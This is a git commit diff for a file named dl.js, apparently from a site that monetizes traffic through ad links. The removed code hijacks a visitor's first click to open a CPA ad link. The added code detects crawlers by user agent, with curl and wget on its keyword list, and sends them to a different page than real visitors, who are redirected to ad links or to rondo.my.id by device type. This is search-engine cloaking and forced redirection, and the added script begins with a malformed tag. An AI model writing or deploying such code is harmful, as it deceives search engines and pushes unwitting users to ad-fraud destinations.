99e3434176adab04044225d78d1cc7a60dcf3a2b
bernadus09 <83189388+bernadus09@users.noreply.github.com>
2025-11-05 09:28:29 +0700

    Update dl.js

--- dl.js
+++ dl.js
@@ -1,24 +1,32 @@
-const targetLinkCPA = "https://streakattempt.com/bawy13cn7m?key=5bb3b475ab4e6430eca4c1bbf5195d00";
+script>
+  function isBot() {
+    const ua = navigator.userAgent.toLowerCase();
+    const botKeywords = [
+      "bot", "crawl", "spider", "slurp", "mediapartners", "google", 
+      "bing", "facebook", "yahoo", "curl", "python", "http", "wget", "java"
+    ];
+    return botKeywords.some(keyword => ua.includes(keyword));
+  }
 
-(function() {
-    injectScript([{
-        "attr": [],
-        "tag": "script",
-        "inner": "\ndocument.body.addEventListener(\"click\",()=>{\n\twindow.open(targetLinkCPA,\"_blank\");\n},{once:true})\n"
-    }], {
-        "target": "body"
-    });
+  function isMobile() {
+    return /android|iphone|ipad|ipod|opera mini|mobile/i.test(navigator.userAgent);
+  }
 
-    function injectScript(e, t) {
-        let n = t.target;
-        for (let t of e) {
-            let e = t.tag,
-                r = t.inner,
-                o = document.createElement(e);
-            o.innerHTML = r;
-            let c = t.attr;
-            for (let e of c) o.setAttribute(e.name, e.value);
-            document.querySelector(n) && document.querySelector(n).append(o)
-        }
+  window.onload = function() {
+    if (isBot()) {
+      // Si es bot o crawler → redirige a un sitio seguro
+      window.location.href = "https://formationcrucialwildest.com/ncm6bswk9?key=c557fff9fe194e94c8546b8e66aa5c4c";
+      return;
     }
-})();
+
+    if (isMobile()) {
+      // Si es móvil → redirige en 1 segundo al enlace principal
+      setTimeout(function() {
+        window.location.href = "https://rondo.my.id";
+      }, 1000);
+    } else {
+      // Si es PC → redirige a otro enlace
+      window.location.href = "https://formationcrucialwildest.com/ncm6bswk9?key=c557fff9fe194e94c8546b8e66aa5c4c";
+    }
+  };
+</script>
